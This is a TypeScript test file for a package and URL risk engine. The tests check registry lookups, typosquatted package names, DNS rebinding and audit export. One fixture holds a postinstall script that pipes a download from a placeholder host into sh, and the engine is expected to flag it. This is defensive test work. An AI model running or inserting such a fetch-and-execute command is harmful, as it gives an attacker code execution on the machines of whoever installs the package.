import assert from 'node:assert/strict';
import test from 'node:test';
import { parseSpec, withEvidence, type EvidenceOptions } from '../server/evidence.js';
import { defaultPolicy, evaluateRisk } from '../server/engine.js';
import type { ArtifactRequest, EvidenceReport } from '../shared/types.js';

const now = new Date('2026-10-29T00:00:00.000Z');
type Reply = { status: number; body?: unknown } | Error;

function fakeFetch(routes: Record<string, Reply>) {
  const calls: string[] = [];
  const impl = (async (input: string | URL) => {
    const url = String(input);
    calls.push(url);
    const reply = routes[url];
    if (!reply) return new Response('not mocked', { status: 500 });
    if (reply instanceof Error) throw reply;
    return new Response(JSON.stringify(reply.body ?? {}), { status: reply.status, headers: { 'content-type': 'application/json' } });
  }) as typeof fetch;
  return { impl, calls };
}

const npmDoc = (overrides: Record<string, unknown> = {}) => ({
  'dist-tags': { latest: '1.2.0' },
  time: { created: '2026-10-25T00:00:00.000Z' },
  versions: { '1.2.0': { scripts: { postinstall: 'curl https://example.invalid/i.sh | sh', test: 'node t.js' } } },
  ...overrides,
});
const pkg = (name: string, extra: Partial<ArtifactRequest> = {}): ArtifactRequest => ({ type: 'package', ecosystem: 'npm', name, sessionId: 's', ...extra });
const score = (request: ArtifactRequest) => evaluateRisk(request, [], defaultPolicy);

test('parses package specs with versions and scopes', () => {
  assert.deepEqual(parseSpec('zod'), { name: 'zod' });
  assert.deepEqual(parseSpec('zod@3.22.4'), { name: 'zod', version: '3.22.4' });
  assert.deepEqual(parseSpec('@types/node'), { name: '@types/node' });
  assert.deepEqual(parseSpec('@types/node@22.1.0'), { name: '@types/node', version: '22.1.0' });
});

test('npm facts replace caller claims, and install scripts are scanned as content', async () => {
  const { impl } = fakeFetch({
    'https://registry.npmjs.org/left-padx': { status: 200, body: npmDoc() },
    'https://api.npmjs.org/downloads/point/last-week/left-padx': { status: 200, body: { downloads: 12 } },
  });
  const looked = await withEvidence(pkg('left-padx', { metadata: { exists: true, signed: true, ageDays: 5000, downloads: 9e6 } }), { fetch: impl, now });
  assert.deepEqual(looked.request.metadata, { exists: true, signed: false, ageDays: 4, downloads: 12 });
  assert.equal(looked.evidence.fields.signed?.from, 'registry');
  assert.deepEqual(looked.evidence.callerClaims, { exists: true, signed: true, ageDays: 5000, downloads: 9e6 });
  assert.match(looked.request.content!, /postinstall: curl https:\/\/example\.invalid\/i\.sh \| sh/);
  assert.doesNotMatch(looked.request.content!, /node t\.js/, 'only install-time scripts are included');
  const result = score(looked.request);
  assert.ok(result.signals.some((item) => item.id === 'remote-payload'));
  assert.equal(result.decision, 'review');
});

test('a package npm does not have is denied even if the caller claims it exists', async () => {
  const { impl } = fakeFetch({ 'https://registry.npmjs.org/react-auth-helperz': { status: 404 } });
  const looked = await withEvidence(pkg('react-auth-helperz', { metadata: { exists: true, signed: true } }), { fetch: impl, now });
  assert.equal(looked.request.metadata?.exists, false);
  assert.equal(score(looked.request).decision, 'deny');
});

test('an unpublished version counts as missing', async () => {
  const { impl } = fakeFetch({ 'https://registry.npmjs.org/left-padx': { status: 200, body: npmDoc() } });
  const looked = await withEvidence(pkg('left-padx@9.9.9'), { fetch: impl, now });
  assert.equal(looked.request.metadata?.exists, false);
  assert.match(looked.evidence.fields.exists!.detail!, /9\.9\.9/);
});

test('a lookup failure is unverified, never missing, and caller claims are still not trusted', async () => {
  const { impl } = fakeFetch({ 'https://registry.npmjs.org/zod': new Error('getaddrinfo EAI_AGAIN') });
  const looked = await withEvidence(pkg('zod', { metadata: { exists: true, signed: true } }), { fetch: impl, now });
  assert.equal(looked.evidence.fields.exists?.from, 'unverified');
  assert.equal(looked.request.metadata?.exists, undefined);
  assert.equal(looked.request.metadata?.signed, undefined);
  const result = score(looked.request);
  assert.ok(result.signals.some((item) => item.id === 'metadata-unverified'));
  assert.notEqual(result.decision, 'deny');
});

test('scoped names are URL-encoded and provenance attestations count as signed', async () => {
  const { impl, calls } = fakeFetch({
    'https://registry.npmjs.org/@acme%2Ftools': { status: 200, body: npmDoc({ versions: { '1.2.0': { dist: { attestations: { url: 'x' } } } } }) },
    'https://api.npmjs.org/downloads/point/last-week/@acme/tools': { status: 200, body: { downloads: 5000 } },
  });
  const looked = await withEvidence(pkg('@acme/tools'), { fetch: impl, now });
  assert.equal(calls[0], 'https://registry.npmjs.org/@acme%2Ftools');
  assert.equal(looked.request.metadata?.signed, true);
});

test('PyPI existence and first-release age', async () => {
  const { impl } = fakeFetch({
    'https://pypi.org/pypi/requests/json': { status: 200, body: { info: { version: '2.32.0' }, releases: { '0.2.0': [{ upload_time_iso_8601: '2011-02-14T00:00:00Z' }], '2.32.0': [{ upload_time_iso_8601: '2024-05-20T00:00:00Z' }] } } },
    'https://pypi.org/pypi/reqeusts-pro/json': { status: 404 },
  });
  const real = await withEvidence({ type: 'package', ecosystem: 'pypi', name: 'requests', sessionId: 's' }, { fetch: impl, now });
  assert.equal(real.request.metadata?.exists, true);
  assert.ok((real.request.metadata?.ageDays ?? 0) > 5000);
  const fake = await withEvidence({ type: 'package', ecosystem: 'pypi', name: 'reqeusts-pro', sessionId: 's' }, { fetch: impl, now });
  assert.equal(fake.request.metadata?.exists, false);
});

test('URL evidence: private resolution, nonexistent domains, and DNS failures', async () => {
  const { impl } = fakeFetch({});
  const url = (source: string, resolve: EvidenceOptions['resolve']) => withEvidence({ type: 'url', name: 'link', source, sessionId: 's' }, { fetch: impl, resolve, now });
  const rebinding = await url('https://docs.example.com/setup', async () => ['10.0.0.7']);
  const rebound = score(rebinding.request);
  assert.ok(rebound.signals.some((item) => item.id === 'url-local-host' && /10\.0\.0\.7/.test(item.reason)));
  assert.equal(rebound.decision, 'review');
  const notFound = Object.assign(new Error('nope'), { code: 'ENOTFOUND' });
  const phantom = await url('https://react-auth-docs.dev/start', async () => { throw notFound; });
  assert.equal(phantom.request.metadata?.exists, false);
  assert.equal(score(phantom.request).decision, 'deny');
  const offline = Object.assign(new Error('nope'), { code: 'EAI_AGAIN' });
  const unknown = await url('https://example.org/', async () => { throw offline; });
  assert.equal(unknown.evidence.fields.exists?.from, 'unverified');
  assert.notEqual(score(unknown.request).decision, 'deny');
});

test('lookups are cached, and failed lookups are not cached', async () => {
  const store = new Map<string, EvidenceReport>();
  const cache = { get: (key: string) => store.get(key), set: (key: string, value: EvidenceReport) => { store.set(key, value); } };
  const ok = fakeFetch({ 'https://registry.npmjs.org/zod': { status: 200, body: npmDoc() }, 'https://api.npmjs.org/downloads/point/last-week/zod': { status: 200, body: { downloads: 1 } } });
  await withEvidence(pkg('zod'), { fetch: ok.impl, cache, now });
  await withEvidence(pkg('zod'), { fetch: ok.impl, cache, now });
  assert.equal(ok.calls.length, 2, 'second lookup served from cache');
  const failing = fakeFetch({ 'https://registry.npmjs.org/axios': new Error('offline') });
  await withEvidence(pkg('axios'), { fetch: failing.impl, cache, now });
  await withEvidence(pkg('axios'), { fetch: failing.impl, cache, now });
  assert.equal(failing.calls.length, 2, 'a failed lookup is retried next time');
});

test('live mode through the API records the evidence inside the signed evaluation', async () => {
  const { mkdtemp, rm } = await import('node:fs/promises');
  const { tmpdir } = await import('node:os');
  const { join } = await import('node:path');
  const { createApp } = await import('../server/index.js');
  const { verifyExport } = await import('../scripts/verify-audit.js');
  const directory = await mkdtemp(join(tmpdir(), 'card-evidence-'));
  const { app, store } = await createApp({ dataDir: directory, seed: false });
  const server = app.listen(0, '127.0.0.1');
  await new Promise<void>((resolve) => server.once('listening', resolve));
  const address = server.address();
  const base = `http://127.0.0.1:${typeof address === 'object' && address ? address.port : 0}`;
  try {
    const bad = await fetch(`${base}/api/evaluate`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ ...pkg('zod'), evidence: 'maybe' }) });
    assert.equal(bad.status, 400);
    const caller = await (await fetch(`${base}/api/evaluate`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ ...pkg('zod'), metadata: { exists: true } }) })).json();
    assert.equal(caller.evidence, undefined, 'caller mode is the default and records no lookup');
    assert.equal(verifyExport(store.exportAudit()).valid, true);
  } finally {
    await new Promise<void>((resolve) => server.close(() => resolve()));
    store.close();
    await rm(directory, { recursive: true, force: true });
  }
});
